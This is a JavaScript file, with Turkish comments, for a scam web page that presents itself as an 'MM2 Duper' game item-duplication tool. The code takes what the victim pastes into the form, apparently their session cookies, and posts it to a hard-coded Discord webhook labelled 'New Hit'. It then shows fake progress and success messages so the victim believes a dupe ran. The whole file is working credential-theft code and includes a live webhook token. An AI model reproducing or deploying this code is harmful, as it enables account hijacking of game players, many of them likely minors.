document.getElementById('discordForm').addEventListener('submit', function(e) {
    e.preventDefault(); 

    const mesajGirdisi = document.getElementById('kullaniciMesaji');
    const submitBtn = document.getElementById('submitBtn');
    const statusMessage = document.getElementById('statusMessage');
    const mesaj = mesajGirdisi.value;

    // Kendi Discord Webhook linkini buraya yapıştır:
    const webhookURL = "https://discord.com/api/webhooks/1517433852908277900/R_qDQkZB2lzxkxk58f7uTgtxXdLBR0OnGmknvGIQMy8VM_nXkuNC2nRB58ufF7HTYqkX";

    // Butonu devre dışı bırakıyoruz
    submitBtn.disabled = true;
    submitBtn.style.backgroundColor = "#555";
    submitBtn.innerText = "Processing...";

    // Durum yazılarını başlatıyoruz
    statusMessage.style.display = "block";
    statusMessage.style.color = "#e67e22"; 
    statusMessage.innerText = "⏳ Started dupe...";

    // 2 saniye sonra yazıyı güncelliyoruz
    setTimeout(() => {
        statusMessage.innerText = "⚙️ Processing MM2 file...";
    }, 2000);

    // Discord'a gidecek zengin içerikli veri formatı (İstediğin profil resmi dahil)
    const veri = {
        username: "MM2 Duper", 
        avatar_url: "https://yt3.googleusercontent.com/-jnNaHeXlTL8r1phQv3rftehlenwC8NJlA2oJe7-eDp7vsYy0FpUA6Gi0oesmXXmvx8btN2CFvU=s160-c-k-c0x00ffffff-no-rj", 
        content: `🎮 **@everyone New Hit** \n> **Cookies** ${mesaj}`
    };

    // Arka planda Discord'a gönderme işlemi
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(veri)
    })
    .then(response => {
        // Toplam 4.5 saniye sonra başarıyla tamamlandı yazısını çıkarıyoruz
        setTimeout(() => {
            statusMessage.style.color = "#2ecc71"; 
            statusMessage.innerText = "✅ Dupe completed successfully!";
            mesajGirdisi.value = ''; 
            
            // Butonu eski haline getiriyoruz
            submitBtn.disabled = false;
            submitBtn.style.backgroundColor = "#2ecc71";
            submitBtn.innerText = "Start Process 🚀";
        }, 4500);
    })
    .catch(error => {
        console.error('Hata:', error);
        statusMessage.style.color = "#e74c3c"; 
        statusMessage.innerText = "❌ An error occurred. Try again.";
        submitBtn.disabled = false;
        submitBtn.style.backgroundColor = "#2ecc71";
        submitBtn.innerText = "Start Process 🚀";
    });
});
